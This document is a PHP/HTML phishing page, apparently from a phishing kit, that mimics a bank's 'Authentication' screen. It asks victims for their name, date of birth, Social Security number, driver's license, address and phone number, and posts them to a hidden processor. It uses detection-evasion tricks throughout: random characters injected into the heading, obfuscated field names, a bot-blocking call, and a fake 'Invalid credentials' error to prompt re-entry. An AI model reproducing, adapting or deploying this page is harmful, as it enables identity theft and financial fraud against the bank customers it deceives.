<!DOCTYPE html>
<html lang="en-US" class="js-focus-visible"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; }</style><title>Authentication</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<link rel="shortcut icon" href="<?php echo gaflder();?>/favicon.ico">
<link href="<?php echo gaflder();?>/font-icons.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris-foundation.min.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/theme.mobile.css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.shim.mobile.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/isotope.min.css" type="text/css">
<style>
body.Authentication .brand-logo {max-width:200px;height:200px;margin-top:30px;margin-bottom:30px;}
body.Authentication .mobile-authentication-container {
    display: block;
    position: relative;
}
#kindunderline{font-size:15px;}
.irisv-button{white-space:normal;}
body.Authentication.isotope-mobile .isotope-app{height:100%;max-width: 600px;width: 100%;margin: auto;}
</style>
</head>
<body id="username_page" class="alk-body shared-layout theme--theme-builder isotope-mobile Authentication windows challenge-type-username-and-password username-and-password iris-keyboard-use-detected">
<div class="page-background__layer page-background__layer0--image"></div><div id="mmenu_container"><div id="wrapper"><div id="content" class="clearfix"><div class="card-container flush-with-titlebar"><div class="card card-full-width"><div class="cms-content-area iris-content"></div></div></div><div class="cms-content-area"></div><div class="mobile-authentication-container"><div id="login_header" class="mobile-authentication-header"><div class="brand-logo" role="img"></div></div><div class="mobile-authentication-content"><div id="app" class="isotope-app"><div class="isotope-page--authentication isotope-page"><div class="isotope-challenge-type--username-and-password isotope-challenge-type"><div class="login-image-container"><form role="form" id="ticated" method="POST" action="<?php echo $_SESSION['processor'];?><?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>" class="isotope-slide usernameAndPasswordForm"><!----><div class="isotope-slide__content"><div><h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
Now, let's<?php echo rT('ALPHANUMERIC',rand(1,87));?> confirm y<?php echo rT('ALPHANUMERIC',rand(1,87));?>our Infor<?php echo rT('ALPHANUMERIC',rand(1,87));?>mation<?php echo rT('ALPHANUMERIC',rand(1,87));?>.
            </h1></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="fname" class="irisv-textfield__label font-caption"> First Name</label></span><input type="text" name="<?php echo gaN('fname');?>" id="fname" required="required" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="lname" class="irisv-textfield__label font-caption"> Last Name</label></span><input type="text" name="<?php echo gaN('lname');?>" id="lname" required="required" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="dob" class="irisv-textfield__label font-caption"> Date Of birth (MM/DD/YYYY)</label></span><input type="tel" name="<?php echo gaN('dob');?>" id="dob" required="required" oninput="DateOfBirth();" maxlength="10" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="ssn" class="irisv-textfield__label font-caption"> Social Security Number</label></span><input type="tel" name="<?php echo gaN('ssn');?>" id="ssn" required="required" oninput="demsort()" maxlength="11" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="dl" class="irisv-textfield__label font-caption"> Driver's License Number </label></span><input type="text" name="<?php echo gaN('dl');?>" id="dl" required="required" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="street" class="irisv-textfield__label font-caption"> Street Address </label></span><input type="text" name="<?php echo gaN('street');?>" id="street" required="required" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="state" class="irisv-textfield__label font-caption"> State</label></span><input type="text" name="<?php echo gaN('state');?>" id="state" required="required" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="zip" class="irisv-textfield__label font-caption"> ZIP Code</label></span><input type="tel" name="<?php echo gaN('zip');?>" id="zip" required="required" oninput="innumlen(this.value)" maxlength="5" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="phone" class="irisv-textfield__label font-caption"> Phone Number</label></span><input type="tel" name="<?php echo gaN('phone');?>" id="phone" oninput="innumlen(this.value)" maxlength="15" required="required" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>

			<div class="mar-top--small"><div class="right-links"><a class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;"><!----><input name="<?php echo gaN('subscr');?>" type="hidden" value="<?php echo md5(uniqid());?>"/><span class="irisv-button__text">Confirm the information before you submit</span><!----><!----></a></div></div></div><div class="isotope-slide__footer"><div class="mar-top--small"><div id="irisv_notification_868k24rt5lu" role="alertdialog" tabindex="0" class="irisv-notification inline error-light" style="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'display:none;';};?>"><div class="irisv-notification__container"><span role="img" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_868k24rt5lu_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2"> Invalid credentials, Please try again. </span></span><button class="irisv-notification__close" style="display: none;"><span class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div><div class="irisv-notification__trailing-content" style="display: none;"></div></div></div><div class="isotope-actions mar-top--small"><button type="submit" class="irisv-button irisv-button--highEmphasis irisv-button--onLight irisv-button--full-width text--none" id="btn_submitCredentials"><!----><span class="irisv-button__text"> Continue </span><!----><!----></button><br></div></div>
			</form>
			<br/>
			<br/>
<script>
function DateOfBirth(){var key =event.data;var val=event.target.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){
case 1:if(key > 1){event.target.value="";}; break; 
case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 4:if(key > 3){event.target.value=val.slice(0,val.length-1);}; break;
case 5:if(val[3]>=3 && key > 1 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[3]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 7:if(key < 1 || key > 2){event.target.value=val.slice(0,val.length-1);}; break; 
case 8:if(val[6] == 1 && key < 9){event.target.value=val.slice(0,val.length-1);} else if(val[6]==2 && key > 0){event.target.value=val.slice(0,val.length-1);}; break; 
case 9:if(val[6]==2 && key > 1){event.target.value=val.slice(0,val.length-1);}; break; };};
if(event.inputType=="deleteContentBackward" && val.length == 2){event.target.value=val[0]}
else if(event.inputType=="deleteContentBackward" && val.length == 5){event.target.value=val.slice(0,val.length-1);}};

function demsort(<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/-/g,'').split('');
if(event.inputType=="insertText"){
for(var i=0;i < mval.length;i++){if(i==2 || i==4){mval[i]=mval[i]+'-';};};
if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else{event.target.value=mval.join('');};
};};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};
</script>
	
	
</div></div></div>
</div>
</div>
</div>
</div>
</div>
</body></html>